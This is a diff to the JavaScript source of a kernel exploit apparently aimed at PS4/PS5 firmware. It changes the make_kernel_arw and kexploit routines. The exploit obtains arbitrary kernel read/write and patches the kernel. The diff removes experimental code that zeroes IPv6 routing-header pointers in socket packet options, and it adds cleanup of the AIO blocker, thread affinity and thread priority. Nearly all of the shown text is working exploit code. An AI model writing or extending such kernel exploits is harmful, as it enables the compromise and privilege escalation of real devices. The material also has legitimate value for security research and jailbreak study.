@@ -42,8 +42,6 @@ import * as config from './config.mjs';
 
 const t1 = performance.now();
 
-
-
 // check if we are running on a supported firmware version
 const [is_ps4, version] = (() => {
     const value = config.target;
@@ -1176,10 +1174,6 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     const psd = pktopts_sds[0];
     const tclass = new Word();
     const off_tclass = is_ps4 ? 0xb0 : 0xc0;
-    
- 
- 
-
 
     const pktopts = new Buffer(0x100);
     const rsize = build_rthdr(pktopts, pktopts.size);
@@ -1479,125 +1473,6 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
      kmem.write64(w_rthdr_p, 0);
      log('corrupt pointers cleaned');
 
-
-   var  SIZEOF_OFILES = 0x8;
-   var SO_PCB        = 0x18;
-   var  INPCB_PKTOPTS = 0x118;
-
-function read64_big(addr) {
-  const i  = kmem.read64(addr);         
-  const lo = BigInt(i.lo >>> 0);
-  const hi = BigInt(i.hi >>> 0);
-  return lo + (hi << 32n);
-}
-    
-function get_fd_data_addr_big(fd) {
-  const fdesc = ofiles_big + BigInt(fd) * BigInt(SIZEOF_OFILES);
-  const filep = read64_big(fdesc);
-  return read64_big(filep);
-}
-
-
-    function get_sock_pktopts_big(fd) {
-  const sock = get_fd_data_addr_big(fd);
-  const pcb  = read64_big(sock + BigInt(SO_PCB));
-  return read64_big(pcb + BigInt(INPCB_PKTOPTS));
-}
-
-    
-try{  
-
-   function read64_big(addr) {
-  const i = kmem.read64(addr);
-  const lo = BigInt(i.lo >>> 0);
-  const hi = BigInt(i.hi >>> 0);
-  return lo + (hi << 32n);
-}
-
-
- for (let i = 0; i < sds.length; i++) {
-    const fd    = BigInt(sds[i]);
-    const filep = read64_big(ofiles      + fd * 8n);
-    const sock  = read64_big(filep);
-    const pcb   = read64_big(sock    + 0x18n);
-    const pkto  = read64_big(pcb     + 0x118n);
-    kmem.write64(pkto + 0x68n, 0n);
-  }
-  {
-    const fd    = BigInt(reclaim_sock);
-    const filep = read64_big(ofiles      + fd * 8n);
-    const sock  = read64_big(filep);
-    const pcb   = read64_big(sock    + 0x18n);
-    const pkto  = read64_big(pcb     + 0x118n);
-    kmem.write64(pkto + 0x68n, 0n);
-  }
-  kmem.write64(worker_pktopts_big + 0x68n, 0n);
-
-    
-log("routing‐header IPv6 fields zeroed");
-   }
-
-    catch(e){
-
-        alert(e.message);
-    }
-
-    
-/*    var  SIZEOF_OFILES = 0x8;
-   var SO_PCB        = 0x18;
-  var  INPCB_PKTOPTS = 0x118;
-
-
-function get_sock_pktopts(fd) {
-    const sock = get_fd_data_addr(fd);          // struct socket *
-    const pcb  = sock.readp(SO_PCB);            // struct inpcb *
-    return pcb.readp(INPCB_PKTOPTS);            // struct ip6_pktopts *
-}
-
-    function get_fd_data_addr(fd) {
-     const idx = new Int(fd * SIZEOF_OFILES, 0);
-    const filep = ofiles.add(idx);      
-    return filep.readp(0);               
-    
-for (let sd of [reclaim_sock, worker_sock, ...sds]) {
-        try {
-            const pkto = get_sock_pktopts(sd);
-            const ptr  = pkto.add(new Int(off_ip6po_rthdr, 0));
-            kmem.write64(ptr, 0);
-        } catch (e) {
-            log(`skip clean rthdr fd=${sd}: ${e}`);
-        }
-    }
-*/
-    
-  
-  /*  
-  
-  
-   kmem.write32(master_sock,       0x100);
-kmem.write32(worker_sock,       0x100);
-kmem.write32(reclaim_sock,      0x100);
-    log("EXTRA CLEAN"); 
-
-  
-  const bump_fds = [
-  ipv6_kernel_rw.data.master_sock,
-  ipv6_kernel_rw.data.victim_sock,
-  main_sock,
-  worker_sock,
-  reclaim_sock
-];
-
-for (let sd of bump_fds) {
-  try {
-    const sockAddr = get_fd_data_addr(sd);      // Int
-    kmem.write32(sockAddr, 0x100);              // bump so_count
-  } catch (e) {
-    log(`skip bump so_count fd=${sd}: ${e}`);
-  }
-}
- */
-    
     /*
     // REMOVE once restore kernel is ready for production
     // increase the ref counts to prevent deallocation
@@ -1605,21 +1480,7 @@ for (let sd of bump_fds) {
     kmem.write32(worker_sock, kmem.read32(worker_sock) + 1);
     // +2 since we have to take into account the fget_write()'s reference
     kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);*/
-
-
-
-
- /*   for (let i = 0; i < sds.length; i++) {
-  const pkto = get_sock_pktopts(sds[i]);
-  kmem.write64(pkto.add(off_ip6po_rthdr), 0);
-}
-
-    const reclaimPkto = get_sock_pktopts(reclaim_sock);
-kmem.write64(reclaimPkto.add(off_ip6po_rthdr), 0);
-
- 
-kmem.write64(worker_pktopts.add(off_ip6po_rthdr), 0);
-    */
+    
     return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
 }
 
@@ -1897,30 +1758,45 @@ export async function kexploit() {
         const [kbase, kmem, p_ucred, restore_info] = make_kernel_arw(
             pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds);
 
-  
-
-
         log('\nSTAGE: Patch kernel');
         await patch_kernel(kbase, kmem, p_ucred, restore_info);
         
     } finally {
+         log('unblock AIO and free blocker');
         close(unblock_fd);
+        aio_multi_wait(block_id.addr, 1);
+        aio_multi_delete(block_id.addr, 1);
 
+        log();
+        for (const name in times) {
+            log(`${name}: ${times[name]}`);
+        }
         const t2 = performance.now();
         const ftime = t2 - t1;
         const init_time = _init_t2 - _init_t1;
+
         log('\ntime (include init): ' + (ftime) / 1000);
         log('kex time: ' + (t2 - _init_t2) / 1000);
         log('init time: ' + (init_time) / 1000);
         log('time to init: ' + (_init_t1 - t1) / 1000);
         log('time - init time: ' + (ftime - init_time) / 1000);
     }
+    log('cleaning up');
+    set_our_affinity(old_mask);
+    sysi('rtprio_thread', RTP_SET, 0, old_rtprio.addr);
     close(block_fd);
     free_aios2(groom_ids.addr, groom_ids.length);
-    aio_multi_wait(block_id.addr, 1);
-    aio_multi_delete(block_id.addr, block_id.length);
     for (const sd of sds) {
         close(sd);
+    }
+    log('cleanup done');
+    {
+        const t2 = performance.now();
+        const ftime = t2 - t1;
+        const init_time = _init_t2 - _init_t1;
+        log('\ntime (include init+cleanup): ' + (ftime) / 1000);
+        log('kex+c time: ' + (t2 - _init_t2) / 1000);
+        log('time (i+c) - init time: ' + (ftime - init_time) / 1000);
     }
 }
 
